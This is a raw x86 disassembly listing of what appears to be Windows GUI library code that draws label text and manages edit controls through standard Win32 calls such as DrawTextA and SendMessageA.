mov edx edi
mov eax esi
call sub_3a9575c
pop ecx
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax ebx
call sub_3ad0d70
call sub_3ad105c
test al al
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
mov eax ebx
call sub_3ad0d70
mov edx [ ebp + 0x10 ]
mov edx [ edx - 0x4 ]
call sub_3ad1094
test al al
jne r-xdata
mov al 0x1
sub_3a9590c
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0xc ] ebx
mov ebx ecx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_3a95bfd
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x94 ]
test bh 0x4
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a0 ] 0x0
jne r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_3ab2548
mov ebx eax
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x68 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x190 ]
call sub_3a8a25c
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a2 ] 0x0
je r-xdata
or ebx 0x800
lea eax [ ebp - 0x8 ]
mov edx r-xdata
call sub_3a6556c
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a0 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x19d ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax ] 0x26
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x190 ]
call sub_3a8a340
mov edx eax
mov eax [ ebp - 0x8 ]
test eax eax
je r-xdata
push 0x1
push 0x1
mov eax [ ebp - 0x10 ]
push eax
call OffsetRect
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x190 ]
mov eax [ eax + 0xc ]
mov edx 0xff000014
call sub_3a89220
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x190 ]
call sub_3a8a340
mov edx eax
mov esi [ ebp - 0x8 ]
mov eax esi
test eax eax
je r-xdata
lea eax [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
call sub_3a65338
and ebx 0xffffffbf
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x1a2 ]
or ebx [ eax * 4 + rw-data ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x19f ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x1 ] 0x0
jne r-xdata
push ebp
mov ecx [ ebp - 0x10 ]
push ecx
push ebx
mov ecx eax
mov eax edx
mov edx [ ebp - 0x8 ]
call sub_3a95854
pop ecx
sub eax 0x4
mov eax [ eax ]
push ebp
mov ecx [ ebp - 0x10 ]
push ecx
push ebx
mov ecx eax
mov eax edx
mov edx [ ebp - 0x8 ]
call sub_3a95854
pop ecx
push 0xffffffff
push 0xffffffff
mov eax [ ebp - 0x10 ]
push eax
call OffsetRect
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x190 ]
mov eax [ eax + 0xc ]
mov edx 0xff000010
call sub_3a89220
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x190 ]
call sub_3a8a340
mov edx eax
mov eax esi
test eax eax
je r-xdata
sub eax 0x4
mov eax [ eax ]
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x1a2 ]
add al 0xfe
sub al 0x2
jae r-xdata
push ebp
mov ecx [ ebp - 0x10 ]
push ecx
push ebx
mov ecx eax
mov eax edx
mov edx [ ebp - 0x8 ]
call sub_3a95854
pop ecx
jmp r-xdata
sub eax 0x4
mov eax [ eax ]
lea eax [ ebp - 0x8 ]
mov edx [ ebp - 0xc ]
call sub_3a65338
mov eax [ ebp - 0x10 ]
mov esi eax
lea edi [ ebp - 0x20 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x190 ]
mov edx r-xdata
call sub_3a8a19c
sub [ ebp - 0x18 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x190 ]
call sub_3a8a340
mov edi eax
mov esi [ ebp - 0xc ]
test esi esi
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a95c04
lea eax [ ebp - 0xc ]
mov edx 0x2
call sub_3a652c4
retn
mov eax ebx
or eax 0x400
push eax
lea eax [ ebp - 0x20 ]
push eax
push esi
mov eax [ ebp - 0xc ]
call sub_3a65730
push eax
push edi
call DrawTextA
mov esi [ ebp - 0x14 ]
sub esi [ ebp - 0x1c ]
mov eax [ ebp - 0x4 ]
call sub_3aaf540
cmp esi eax
jle r-xdata
sub esi 0x4
mov esi [ esi ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x190 ]
mov eax [ eax + 0xc ]
call sub_3a894c0
cmp esi eax
jle r-xdata
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_3a69f5c
mov esi eax
test esi esi
jne r-xdata
dec esi
mov edx esi
mov eax [ ebp - 0x8 ]
call sub_3a6dd34
cmp al 0x1
jne r-xdata
mov eax [ ebp - 0x8 ]
test eax eax
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
mov ecx esi
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_3a65798
lea eax [ ebp - 0xc ]
mov ecx r-xdata
mov edx [ ebp - 0x8 ]
call sub_3a655b8
cmp [ ebp - 0x8 ] 0x0
je r-xdata
dec esi
mov esi eax
sub eax 0x4
mov eax [ eax ]
jmp r-xdata
sub_3a95c30
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov esi edx
lea edi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
push 0x0
lea eax [ ebp - 0x4 ]
push eax
mov eax ebx
call sub_3a8a340
lea edx [ ebp - 0x18 ]
mov ecx 0x2
call sub_3a90f50
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_3a95cab
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x14 ]
call sub_3a89b74
push eax
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call FillRect
lea edx [ ebp - 0x18 ]
mov cl 0xff
mov eax [ ebp - 0x8 ]
call sub_3a91048
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a95cb2
or edx 0xffffffff
mov eax [ ebp - 0x8 ]
call sub_3a90fdc
retn
sub_3a95cbc
push ebx
push esi
push edi
add esp 0xffffffe0
mov edi eax
call sub_3abdd24
call sub_3abde2c
test al al
je r-xdata
xor ebx ebx
jmp r-xdata
call sub_3a91b8c
test al al
je r-xdata
test bl bl
je r-xdata
test [ edi + 0x1c ] 0x10
je r-xdata
mov esi [ edi + 0x190 ]
mov edx esp
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax edi
call sub_3a95fd4
test al al
jne r-xdata
mov dl 0x1
mov eax edi
call sub_3ac463c
mov ebx eax
test ebx ebx
je r-xdata
mov bl 0x1
test bl bl
je r-xdata
mov edx [ edi + 0x70 ]
mov eax [ esi + 0x14 ]
call sub_3a89b20
xor edx edx
mov eax [ esi + 0x14 ]
call sub_3a89c5c
test bl bl
jne r-xdata
xor eax eax
jmp r-xdata
mov eax ebx
call sub_3ad0d70
call sub_3ad105c
test al al
je r-xdata
mov dl 0x1
mov eax [ esi + 0x14 ]
call sub_3a89c5c
movzx eax [ edi + 0x19f ]
movzx ebx [ eax * 2 + rw-data ]
or bx 0x40
movzx eax [ edi + 0x19c ]
or bx [ eax * 2 + rw-data ]
movzx ebx bx
cmp [ edi + 0x19e ] 0x0
je r-xdata
push 0x4
call GetStockObject
push eax
lea eax [ esp + 0x4 ]
push eax
mov eax esi
call sub_3a8a340
push eax
call FillRect
mov edx esp
mov eax [ edi + 0x190 ]
call sub_3a95c30
jmp r-xdata
mov edx esp
mov eax esi
call sub_3a89f04
jmp r-xdata
mov ebx eax
mov eax ebx
call sub_3ad0d70
mov edx edi
call sub_3ad1094
test al al
jne r-xdata
mov edx esp
mov ecx ebx
mov eax edi
mov si 0xffc5
call sub_3a6457c
add esp 0x20
pop edi
pop esi
pop ebx
retn
push edi
lea esi [ esp + 0x4 ]
lea edi [ esp + 0x14 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
mov ecx ebx
or ecx 0x400
lea edx [ esp + 0x10 ]
mov eax edi
mov si 0xffc5
call sub_3a6457c
cmp [ edi + 0x19e ] 0x2
jne r-xdata
mov al 0x1
mov eax [ edi + 0x4c ]
sub eax [ esp + 0x1c ]
sar eax 0x1
jns r-xdata
mov eax [ edi + 0x4c ]
sub eax [ esp + 0x1c ]
push eax
push 0x0
lea eax [ esp + 0x8 ]
push eax
call OffsetRect
jmp r-xdata
push eax
push 0x0
lea eax [ esp + 0x8 ]
push eax
call OffsetRect
adc eax 0x0
sub_3a95e58
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x2
jne r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x19d ] 0x0
je r-xdata
lea edx [ ebp - 0x19 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
push 0x0
call GetDC
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_3a95f06
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x190 ]
mov edx [ ebp - 0x8 ]
call sub_3a8a3c8
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x19f ]
movzx ecx [ eax * 2 + rw-data ]
or cx 0x440
movzx ecx cx
lea edx [ ebp - 0x19 ]
mov eax [ ebp - 0x4 ]
mov si 0xffc5
call sub_3a6457c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x190 ]
xor edx edx
call sub_3a8a3c8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a95f0d
mov eax [ ebp - 0x8 ]
push eax
push 0x0
call ReleaseDC
retn
sub_3a95f0d
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x40 ]
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x19c ]
mov [ ebp - 0x9 ] al
mov eax [ ebp - 0x4 ]
mov si 0xffc7
call sub_3a6457c
test al al
je r-xdata
cmp [ ebp - 0x9 ] 0x1
jne r-xdata
lea eax [ ebp - 0x9 ]
call sub_3aac488
mov eax [ ebp - 0x11 ]
push eax
mov eax [ ebp - 0xd ]
push eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x44 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x88 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
sub eax [ ebp - 0x11 ]
add ebx eax
sub_3a96014
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_3a95fd4
cmp bl al
je r-xdata
mov [ esi + 0x1a1 ] 0x1
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov eax [ r-xdata ]
or eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
mov eax [ r-xdata ]
not eax
and eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
jmp r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x80 ]
sub_3a9607c
push esi
push edi
mov edi eax
cmp dl [ edi + 0x19f ]
je r-xdata
pop edi
pop esi
retn
mov [ edi + 0x19f ] dl
mov eax edi
mov si 0xffc6
call sub_3a6457c
mov eax edi
mov edx [ eax ]
call [ edx + 0x80 ]
sub_3a960a8
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_3aaeeac
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp esi [ edi + 0x198 ]
jne r-xdata
xor eax eax
mov [ edi + 0x198 ] eax
sub_3a9610c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_3a96199
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x198 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a961a0
lea eax [ ebp - 0x4 ]
call sub_3a652a0
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
cmp [ ebx + 0x1a0 ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_3aafb88
mov edx [ ebp - 0x4 ]
movzx eax [ edi + 0x4 ]
call sub_3ac4588
test al al
je r-xdata
mov ebx [ ebx + 0x198 ]
mov eax ebx
mov si 0xffb6
call sub_3a6457c
test al al
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xd4 ]
mov [ edi + 0xc ] 0x1
sub_3a961a8
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_3ab29f0
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_3a646e4
mov eax [ r-xdata ]
mov [ esi + 0x50 ] eax
mov eax [ r-xdata ]
mov [ esi + 0x50 ] eax
jmp r-xdata
mov eax esi
pop esi
pop ebx
retn
call sub_3a6473c
pop [ fs : 0x0 ]
add esp 0xc
mov edx 0x79
mov eax esi
call sub_3aaf278
mov edx 0x19
mov eax esi
call sub_3aaf2ac
mov dl 0x1
mov eax esi
call sub_3ab7f08
xor edx edx
mov eax esi
call sub_3aafd7c
mov [ esi + 0x254 ] 0x1
mov [ esi + 0x257 ] 0x1
mov [ esi + 0x258 ] 0x1
mov [ esi + 0x259 ] 0x1
mov eax esi
call sub_3a9692c
mov [ esi + 0x268 ] 0xffffffff
mov [ esi + 0x26c ] 0xffffffff
mov eax esi
test bl bl
je r-xdata
sub_3a96264
push ebx
push esi
mov esi edx
mov ebx eax
push 0x0
push esi
push 0xc5
mov eax ebx
call sub_3ab7c38
push eax
call __imp_SendMessageA
pop esi
pop ebx
retn
sub_3a962e4
push ebx
push esi
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x250 ]
je r-xdata
pop esi
pop ebx
retn
mov [ ebx + 0x250 ] esi
mov eax ebx
call sub_3ab7fd8
test al al
je r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xd8 ]
sub_3a96328
push ebx
push esi
mov esi eax
movzx ebx [ esi + 0x25d ]
mov eax esi
call sub_3ab7fd8
test al al
je r-xdata
mov eax ebx
pop esi
pop ebx
retn
push 0x0
push 0x0
push 0xb8
mov eax esi
call sub_3ab7c38
push eax
call __imp_SendMessageA
test eax eax
setne bl
sub_3a96360
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_3ab7fd8
test al al
je r-xdata
mov [ esi + 0x25d ] bl
pop esi
pop ebx
retn
push 0x0
movzx eax bl
push eax
push 0xb9
mov eax esi
call sub_3ab7c38
push eax
call __imp_SendMessageA
pop esi
pop ebx
retn
sub_3a96398
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_3a96414
push [ fs : eax ]
mov [ fs : eax ] esp
cmp dl [ ebx + 0x255 ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a9641b
lea eax [ ebp - 0x4 ]
call sub_3a652a0
retn
mov [ ebx + 0x255 ] dl
mov eax ebx
call sub_3ab7fd8
test al al
je r-xdata
push 0x0
movzx eax [ ebx + 0x255 ]
push eax
push 0xcc
mov eax ebx
call sub_3ab7c38
push eax
call __imp_SendMessageA
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_3aafb88
mov eax [ ebp - 0x4 ]
call sub_3a65730
mov edx eax
mov eax ebx
call sub_3aafb64
sub_3a96420
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x256 ]
je r-xdata
pop esi
pop ebx
retn
mov [ esi + 0x256 ] bl
mov eax esi
call sub_3ab7fd8
test al al
je r-xdata
push 0x0
movzx eax bl
push eax
push 0xcf
mov eax esi
call sub_3ab7c38
push eax
call __imp_SendMessageA
sub_3a9645c
push ebx
push ecx
mov ebx eax
push 0x0
lea eax [ esp + 0x4 ]
push eax
push 0xb0
mov eax ebx
call sub_3ab7c38
push eax
call __imp_SendMessageA
mov eax [ esp ]
pop edx
pop ebx
retn
sub_3a96480
push ebx
push esi
mov esi edx
mov ebx eax
push esi
push esi
push 0xb1
mov eax ebx
call sub_3ab7c38
push eax
call __imp_SendMessageA
pop esi
pop ebx
retn
sub_3a964a0
push ebx
add esp 0xfffffff8
mov ebx eax
lea eax [ esp + 0x4 ]
push eax
lea eax [ esp + 0x4 ]
push eax
push 0xb0
mov eax ebx
call sub_3ab7c38
push eax
call __imp_SendMessageA
mov eax [ esp + 0x4 ]
sub eax [ esp ]
pop ecx
pop edx
pop ebx
retn
sub_3a964d0
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
lea eax [ esp + 0x4 ]
push eax
lea eax [ esp + 0x4 ]
push eax
push 0xb0
mov eax ebx
call sub_3ab7c38
push eax
call __imp_SendMessageA
add esi [ esp ]
mov [ esp + 0x4 ] esi
mov eax [ esp + 0x4 ]
push eax
mov eax [ esp + 0x4 ]
push eax
push 0xb1
mov eax ebx
call sub_3ab7c38
push eax
call SendMessageA
push 0x0
push 0x0
push 0xb7
mov eax ebx
call sub_3ab7c38
push eax
call SendMessageA
pop ecx
pop edx
pop esi
pop ebx
retn
sub_3a9656c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xe0 ]
mov esi eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xdc ]
mov [ ebp - 0x8 ] eax
mov eax ebx
call sub_3aafaf8
inc eax
call sub_3a6a374
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_3a965f6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
call sub_3a6a388
mov ecx eax
mov edx [ ebp - 0xc ]
mov eax ebx
call sub_3aafb08
cmp edi [ ebp - 0x8 ]
jg r-xdata
mov edx [ ebp - 0xc ]
add edx esi
mov ecx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_3a6a1ac
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a965fd
mov eax [ ebp - 0xc ]
call sub_3a6a3c0
retn
dec edi
mov [ ebp - 0x8 ] edi
sub_3a96608
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xe0 ]
mov [ ebp - 0x8 ] eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xdc ]
mov esi eax
mov eax edi
mov ecx esi
xor edx edx
call sub_3a65390
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax ebx
call sub_3aafaf8
inc eax
call sub_3a6a374
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_3a96696
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_3a6a388
mov ecx eax
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_3aafb08
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
add eax edx
mov edx [ edi ]
mov ecx esi
call sub_3a63154
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_3a6a3c0
retn
sub_3a966a4
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_3ab3d30
mov ecx r-xdata
mov edx esi
mov eax ebx
call sub_3ab3c5c
mov eax [ esi + 0x4 ]
or eax 0xc0
movzx edx [ ebx + 0x254 ]
or eax [ edx * 4 + rw-data ]
cmp [ ebx + 0x255 ] 0x0
setne dl
and edx 0x7f
or eax [ edx * 4 + rw-data ]
movzx edx [ ebx + 0x256 ]
or eax [ edx * 4 + rw-data ]
movzx edx [ ebx + 0x25b ]
or eax [ edx * 4 + rw-data ]
movzx edx [ ebx + 0x259 ]
or eax [ edx * 4 + rw-data ]
movzx edx [ ebx + 0x25a ]
or eax [ edx * 4 + rw-data ]
mov [ esi + 0x4 ] eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x1d9 ] 0x0
je r-xdata
cmp [ ebx + 0x254 ] 0x1
jne r-xdata
and [ esi + 0x4 ] 0xff7fffff
or [ esi + 0x8 ] 0x200
sub_3a96759
add [ eax ] al
add [ ebx + 0x56 ] dl
push edi
add esp 0xffffff74
mov ebx eax
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
mov eax ebx
call sub_3ab402c
mov eax [ rw-data ]
cmp [ eax ] 0x2
je r-xdata
test [ edx + 0x5 ] 0x8
je r-xdata
mov esi edx
mov edi esp
mov ecx 0x23
[ edi ] [ esi ]
and [ esp + 0x4 ] 0xfffff7ff
mov edx esp
mov eax ebx
call sub_3ab402c
mov eax [ ebx + 0x1b4 ]
test eax eax
je r-xdata
add esp 0x8c
pop edi
pop esi
pop ebx
retn
push 0x0
push 0x1
push 0xcf
push eax
call __imp_SendMessageA
jmp r-xdata
sub_3a967cc
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x25c ] 0x1
xor eax eax
push ebp
push sub_3a9680b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_3ab3e5c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a96812
mov eax [ ebp - 0x4 ]
mov [ eax + 0x25c ] 0x0
retn
sub_3a96812
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x250 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xd8 ]
mov eax [ ebp - 0x4 ]
movzx edx [ eax + 0x25d ]
mov eax [ ebp - 0x4 ]
call sub_3a96360
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x255 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x26c ]
cmp eax 0xffffffff
je r-xdata
push 0x0
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x255 ]
push eax
push 0xcc
mov eax [ ebp - 0x4 ]
call sub_3ab7c38
push eax
call __imp_SendMessageA
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x268 ]
cmp eax 0xffffffff
je r-xdata
mov edx eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xec ]
mov eax [ ebp - 0x4 ]
mov [ eax + 0x26c ] 0xffffffff
mov eax [ ebp - 0x4 ]
call sub_3a968f0
pop ecx
pop ebp
retn
mov edx eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xe8 ]
sub_3a968b4
push ebx
mov ebx eax
mov eax ebx
call sub_3a96328
mov [ ebx + 0x25d ] al
mov eax ebx
mov edx [ eax ]
call [ edx + 0xdc ]
mov [ ebx + 0x268 ] eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xe0 ]
mov [ ebx + 0x26c ] eax
mov eax ebx
call sub_3ab4248
pop ebx
retn
sub_3a968f0
push ebx
mov ebx eax
cmp [ ebx + 0x257 ] 0x0
je r-xdata
mov eax [ r-xdata ]
not eax
and eax [ ebx + 0x50 ]
mov [ ebx + 0x50 ] eax
pop ebx
retn
cmp [ ebx + 0x254 ] 0x1
jne r-xdata
mov eax [ r-xdata ]
or eax [ ebx + 0x50 ]
mov [ ebx + 0x50 ] eax
mov eax ebx
call sub_3a9692c
pop ebx
retn
sub_3a9692c
push ebp
mov ebp esp
add esp 0xffffff88
push ebx
mov [ ebp - 0x4 ] eax
push 0x0
call GetDC
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_3a969a2
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call GetTextMetricsA
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x68 ]
call sub_3a89260
push eax
mov eax [ ebp - 0x8 ]
push eax
call SelectObject
mov ebx eax
lea eax [ ebp - 0x78 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call GetTextMetricsA
push ebx
mov eax [ ebp - 0x8 ]
push eax
call SelectObject
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a969a9
mov eax [ ebp - 0x8 ]
push eax
push 0x0
call ReleaseDC
retn
sub_3a969a9
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov ebx [ ebp - 0x40 ]
mov eax [ ebp - 0x78 ]
cmp ebx eax
jle r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1d9 ] 0x0
je r-xdata
push 0x6
call GetSystemMetrics
add eax eax
add eax eax
test ebx ebx
jns r-xdata
mov ebx eax
mov ebx 0x6
mov ebx 0x8
jmp r-xdata
sar ebx 0x2
add eax ebx
mov ebx eax
add ebx 0x3
mov edx [ ebp - 0x78 ]
add edx ebx
mov eax [ ebp - 0x4 ]
call sub_3aaf2ac
pop ebx
mov esp ebp
pop ebp
retn
push 0x6
call GetSystemMetrics
imul ebx eax
jmp r-xdata
sub_3a96a34
push ebp
mov ebp esp
add esp 0xffffffe8
push esi
push edi
mov esi edx
lea edi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
push 0x0
lea edx [ ebp - 0x4 ]
push edx
lea edx [ ebp - 0x18 ]
mov ecx 0x2
call sub_3a90f50
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_3a96aab
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x4
mov eax [ ebp - 0x4 ]
push eax
push 0x318
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_3ab7c38
push eax
call __imp_SendMessageA
lea edx [ ebp - 0x18 ]
mov cl 0xff
mov eax [ ebp - 0x8 ]
call sub_3a91048
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a96ab2
or edx 0xffffffff
mov eax [ ebp - 0x8 ]
call sub_3a90fdc
retn
sub_3a96ab8
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
sub eax 0x7
je r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x1
jne r-xdata
sub eax 0xb046
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_3ab522c
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
call IsWindow
test eax eax
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x26c ] 0x0
jne r-xdata
sub eax 0xce6
je r-xdata
mov eax [ ebp - 0x8 ]
xor edx edx
mov [ eax + 0x4 ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_3ab7c38
push eax
call GetDC
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_3a96c15
push [ fs : eax ]
mov [ fs : eax ] esp
push ebp
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0xc ]
call sub_3a96a34
pop ecx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x26c ] 0xffffffff
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x4 ]
call sub_3ab7c38
push eax
call ReleaseDC
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x240 ] 0x0
je r-xdata
jmp r-xdata
call sub_3a91b8c
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x26c ] 0xffffffff
jne r-xdata
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_3ac463c
mov ebx eax
test ebx ebx
je r-xdata
mov eax ebx
call sub_3ad0d70
call sub_3ad105c
test al al
je r-xdata
mov eax ebx
call sub_3ad0d70
mov edx [ ebp - 0x4 ]
call sub_3ad1094
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
xor edx edx
